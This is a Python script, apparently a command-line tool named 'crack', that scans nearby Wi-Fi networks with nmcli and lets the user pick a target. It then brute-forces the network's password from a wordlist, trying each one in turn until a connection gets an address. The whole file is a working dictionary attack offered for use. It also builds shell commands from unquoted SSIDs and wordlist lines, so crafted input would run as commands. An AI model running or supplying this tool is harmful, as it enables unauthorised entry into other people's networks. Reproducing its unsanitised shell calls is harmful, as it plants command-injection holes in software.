import os
import sys

inet = list()

helpinfo = """crack { KEY } { VALUE }\ncrack { COMMAND }\n\nKEYS:\t\t{ -h | --help | help } - Print help info\n\t\t{ -f | --file | file } - File or files containing a list of possible passwords\n\nCOMMAND:\t{ scan } - Displays all available networks\n\t\t{ forget } - Deletes network data currently connected\n\t\t{ active } - Displays connected network"""
commands = ["-h", "--help", "help", "-f", "--file", "file", "scan", "forget", "active"]

args = sys.argv[1:]

ls = list(os.popen("ls"))
lst = list()

for l in ls:
    lst.append(l.strip())
flag = True
FILE = args[1:]
for arg in args[1:]:
    if arg not in lst:
        flag = False
        FILE = arg
        break

passwords = None

l = len(args)
if l >= 2:
    key, *vals = args
    if key.lower() not in commands:
        sys.exit("Command does exist")
    if key.lower() == "-f" or key.lower() == "--file" or key.lower() == "file":
        for val in vals:
            try:
                with open(val, 'r') as f:
                    passwords = f.read().split("\n")
            except:
                pass
    else:
        print("Command does exist")
elif l == 1:
    key = args[0]
    if key.lower() not in commands:
        sys.exit("Command does exist")
    if key.lower() == "-h" or key.lower() == "--help" or key.lower() == "help":
        sys.exit(helpinfo)
    elif key.lower() == "-f" or key.lower() == "--file" or key.lower() == "file": 
        sys.exit("files missing")
    elif key.lower() == "scan":
        os.system("nmcli d wifi")
        sys.exit()
    elif key.lower() == "forget":
        r = os.popen('nmcli d')
        res = list()
        for i in r:
            res.append(i.strip())
        name = res[1].split()[-1]
        os.system("nmcli con delete {}".format(name))
        sys.exit("the network has been successfully deleted")
    elif key.lower() == "active":
        os.system("nmcli d")
        sys.exit()
    else:
        print("Command does exist")
else:
    sys.exit("commands are missing, use the '--help' command to know more")

res = list(os.popen("nmcli d wifi"))
r = ''.join(res)
res = r.split("\n")
result = list()
for i in res:
    result.append(i[1:].strip())
ssid = list()
for res in result[1:-1]:
    res = res.split()[0]
    ssid.append(res)

if flag:
    print("ID\tSSID")
    for i in range(1, len(ssid)+1):
        print("[{}]\t".format(i)+ssid[i-1])
    while True:
        ch = input("Target's ID: ")
        if ch.isdigit():
            if int(ch) >= 1 and int(ch) <= len(ssid):
                ind = int(ch) - 1
                break
            else:
                print("The ID does not exist")
        else:
            print("The ID does not exist")    
else:
    sys.exit("file {} does exist".format(FILE))

SSID = ssid[ind]

if passwords:
    for PASSWORD in passwords:
        os.system("nmcli d wifi connect {} password {}".format(SSID, PASSWORD))
        conf = list(os.popen("ifconfig"))
        config = ''.join(conf).split("\n")
        inet = list()
        for conf in config:
            if "inet " in conf.strip():
                inet.append(conf.strip())
        if len(inet) < 2:
            os.system("nmcli con delete {}".format(SSID))
        else:
            print()
            print("\x1B[33;49mPassword successfully cracked >>", "\x1B[32;49m"+PASSWORD, end="\n\n")
            break
else:
    sys.exit(helpinfo)
